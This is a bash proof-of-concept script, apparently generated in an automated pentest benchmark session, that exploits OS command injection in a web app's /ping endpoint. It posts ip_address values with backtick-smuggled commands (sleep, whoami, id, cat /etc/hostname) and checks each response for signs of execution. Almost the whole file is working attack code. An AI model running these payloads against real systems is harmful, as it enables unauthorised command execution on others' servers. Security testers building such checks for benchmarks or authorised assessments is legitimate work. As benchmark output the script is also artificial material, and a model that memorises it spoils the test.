#!/bin/bash
# POC: Demonstrates OS command injection via backtick command substitution in /ping endpoint. Tests that backtick-enclosed commands execute and their output is substituted.
# Target: ./repo
# Created: 2025-11-10T15:05:04.651Z
# Session: benchmark-XBEN-037-24-mht9nqa0

# OS Command Injection via Backtick Command Substitution POC
# Target: /ping endpoint with ip_address parameter
# Vulnerability: Backtick command substitution allows arbitrary command execution

TARGET_HOST="${1:-127.0.0.1}"
TARGET_PORT="${2:-80}"
TARGET_URL="http://${TARGET_HOST}:${TARGET_PORT}/ping"

echo "[*] OS Command Injection via Backtick Substitution POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Sleep command to verify execution time (backtick substitution)
echo "[Test 1] Backtick substitution with sleep command"
echo "[*] Payload: 127.0.0.1\`sleep 3\`"
START_TIME=$(date +%s%N)
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\`sleep 3\`" "$TARGET_URL" 2>&1)
END_TIME=$(date +%s%N)
DURATION_MS=$(( (END_TIME - START_TIME) / 1000000 ))
echo "[*] Response time: ${DURATION_MS}ms"
echo "[*] Response: $RESPONSE"

if [ $DURATION_MS -ge 3000 ]; then
    echo "[+] SUCCESS: Sleep command was executed (backtick substitution confirmed)"
else
    echo "[-] FAILED: Sleep did not execute as expected"
fi
echo ""

# Test 2: Command substitution with whoami
echo "[Test 2] Backtick substitution with whoami command"
echo "[*] Payload: 127.0.0.1\`whoami\`"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\`whoami\`" "$TARGET_URL" 2>&1)
echo "[*] Response: $RESPONSE"

if echo "$RESPONSE" | grep -qE "(root|www-data|user)"; then
    echo "[+] SUCCESS: whoami output detected in response (command substitution confirmed)"
elif [ ! -z "$RESPONSE" ]; then
    echo "[+] SUSPICIOUS: Got response with injected command - may indicate command execution"
fi
echo ""

# Test 3: File read via command substitution
echo "[Test 3] Backtick substitution with cat command"
echo "[*] Payload: 127.0.0.1\`cat /etc/hostname\`"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\`cat /etc/hostname\`" "$TARGET_URL" 2>&1)
echo "[*] Response: $RESPONSE"

if [ ! -z "$RESPONSE" ] && [ "$RESPONSE" != "ping: invalid address" ]; then
    echo "[+] SUSPICIOUS: Response suggests file content may be included"
fi
echo ""

# Test 4: Command output substitution with id
echo "[Test 4] Backtick substitution with id command"
echo "[*] Payload: 127.0.0.1\`id\`"
RESPONSE=$(curl -s -X POST -d "ip_address=127.0.0.1\`id\`" "$TARGET_URL" 2>&1)
echo "[*] Response: $RESPONSE"

if echo "$RESPONSE" | grep -qE "(uid=|gid=)"; then
    echo "[+] SUCCESS: id command output detected (command substitution confirmed)"
else
    echo "[*] Response received: $RESPONSE"
fi
echo ""

echo "[*] POC Complete"